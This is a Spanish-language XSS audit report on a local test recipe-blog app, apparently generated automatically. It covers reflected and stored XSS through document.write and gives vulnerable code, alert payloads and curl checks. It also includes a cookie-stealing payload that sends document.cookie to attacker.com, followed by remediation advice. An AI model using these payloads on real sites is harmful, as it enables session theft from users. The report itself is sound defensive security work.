# Informe de Auditoría de Seguridad - Cross-Site Scripting (XSS)

**Objetivo:** http://web.dev.local:8082  
**Fecha:** 2026-04-30 15:53:23  
**Tipo de análisis:** Detección y explotación de vulnerabilidades XSS  

---

## 1. Resumen Ejecutivo

Se identificaron **dos vulnerabilidades XSS** en la aplicación web "Blog de Recetas":

1. **XSS Reflejado (Reflected XSS)** — parámetro `search` en la URL
2. **XSS Almacenado (Stored XSS)** — sección de comentarios (parámetros `name` y `comment`)

Ambas vulnerabilidades se originan en el uso inseguro de `document.write()` con datos de usuario no sanitizados directamente en JavaScript del lado del cliente.

---

## 2. Descripción de la Aplicación

La aplicación es un "Blog de Recetas" con:
- Un buscador de recetas que admite parámetros via GET (`?search=...`)
- Una sección de comentarios que acepta `name` y `comment` via GET

Toda la lógica de presentación se realiza mediante JavaScript en el cliente usando `document.write()`, sin ninguna sanitización ni codificación de la entrada del usuario.

---

## 3. Vulnerabilidades Encontradas

### 3.1 XSS Reflejado — Parámetro `search`

**Severidad:** Alta (CVSS ~7.4)  
**Tipo:** Reflected XSS  
**Parámetro vulnerable:** `search`  

**Código vulnerable:**
```javascript
const searchTerm = urlParams.get('search');
// ...
if (searchTerm) {
    document.write('<p>Resultados para: <strong>' + searchTerm + '</strong></p>');
}
```

El valor del parámetro `search` se inserta directamente en `document.write()` sin ningún tipo de escape o sanitización, permitiendo la inyección de HTML y JavaScript arbitrario.

**Payload de explotación:**
```
http://web.dev.local:8082/?search=<script>alert('XSS')</script>
```

**Payload alternativo (evasión de filtros):**
```
http://web.dev.local:8082/?search=<img src=x onerror=alert(document.cookie)>
```

**Impacto:** Al hacer clic en un enlace manipulado, el código JavaScript del atacante se ejecuta en el navegador de la víctima en el contexto del sitio web.

---

### 3.2 XSS Almacenado — Sección de Comentarios

**Severidad:** Alta (CVSS ~8.0)  
**Tipo:** Stored XSS (persistente vía localStorage)  
**Parámetros vulnerables:** `name`, `comment`  

**Código vulnerable:**
```javascript
const name = urlParams.get('name');
const comment = urlParams.get('comment');

if (name && comment) {
    let comments = JSON.parse(localStorage.getItem('comments') || '[]');
    comments.push({ name: name, comment: comment, date: new Date().toLocaleString() });
    localStorage.setItem('comments', JSON.stringify(comments));
}

// Al mostrar:
document.write('<div class="comment-author">' + c.name + '</div>');
document.write('<div>' + c.comment + '</div>');
```

Los valores se almacenan en `localStorage` sin sanitizar y luego se renderizan directamente con `document.write()`, creando un XSS almacenado que persiste en el navegador.

**Payload de explotación:**
```
http://web.dev.local:8082/?name=Atacante&comment=<script>alert('Stored XSS')</script>
```

**Payload de robo de cookies:**
```
http://web.dev.local:8082/?name=Hacker&comment=<img src=x onerror="document.location='http://attacker.com/steal?c='+document.cookie">
```

**Impacto:** El payload se ejecuta cada vez que el usuario afectado visita la página, sin necesidad de hacer clic en ningún enlace adicional.

---

## 4. Prueba de Concepto (PoC)

### Test 1 — Reflected XSS confirmado
```bash
curl -s "http://web.dev.local:8082/?search=<script>alert('XSS')</script>"
# Respuesta contiene: document.write('...' + searchTerm + '...')
# donde searchTerm = "<script>alert('XSS')</script>" sin sanitizar
```

### Test 2 — Stored XSS confirmado
```bash
curl -s "http://web.dev.local:8082/?name=Test&comment=<script>alert(1)</script>"
# El payload se almacena en localStorage y se ejecuta al renderizar comentarios
```

---

## 5. Análisis de Causa Raíz

El problema fundamental es el uso de `document.write()` con concatenación de strings directa usando input no sanitizado:

```javascript
// ❌ INSEGURO
document.write('<p>Resultados para: <strong>' + searchTerm + '</strong></p>');

// ✅ CORRECTO - escapar HTML antes de insertar
function escapeHtml(str) {
    return str.replace(/&/g, '&amp;')
              .replace(/</g, '&lt;')
              .replace(/>/g, '&gt;')
              .replace(/"/g, '&quot;')
              .replace(/'/g, '&#039;');
}
document.write('<p>Resultados para: <strong>' + escapeHtml(searchTerm) + '</strong></p>');
```

---

## 6. Vectores de Ataque

| Vector | Tipo | Parámetro | Severidad |
|--------|------|-----------|-----------|
| URL manipulada enviada por email/chat | Reflected XSS | `search` | Alta |
| Inyección de payload via URL | Stored XSS | `name`, `comment` | Alta |
| Robo de cookies de sesión | Reflected/Stored | Ambos | Alta |
| Redirección a sitios maliciosos | Reflected/Stored | Ambos | Alta |
| Defacement de página | Stored | `comment` | Media |

---

## 7. Recomendaciones

1. **Escapar toda salida HTML**: Utilizar funciones de escape como `DOMPurify`, `textContent` en lugar de `innerHTML`, o implementar una función `escapeHtml()` manual.
2. **Evitar `document.write()`**: Reemplazar por `createElement` + `textContent` o usar frameworks con auto-escape (React, Vue, Angular).
3. **Content Security Policy (CSP)**: Implementar cabeceras CSP para limitar la ejecución de scripts inline.
4. **Validación del lado del servidor**: Aunque la lógica es cliente-side, validar y sanitizar cualquier dato antes de persistirlo.
5. **HttpOnly en cookies**: Marcar las cookies de sesión como `HttpOnly` para mitigar el impacto del robo de cookies vía XSS.

---

## 8. Conclusión

La aplicación "Blog de Recetas" presenta vulnerabilidades XSS críticas tanto de tipo reflejado como almacenado. Ambas fueron confirmadas mediante análisis estático del código fuente JavaScript. La causa raíz es la falta de sanitización de la entrada del usuario antes de insertarla en el DOM mediante `document.write()`. Se recomienda remediar estas vulnerabilidades de forma inmediata antes de exponer la aplicación a usuarios reales.

---

*Informe generado automáticamente por análisis de seguridad autorizado.*
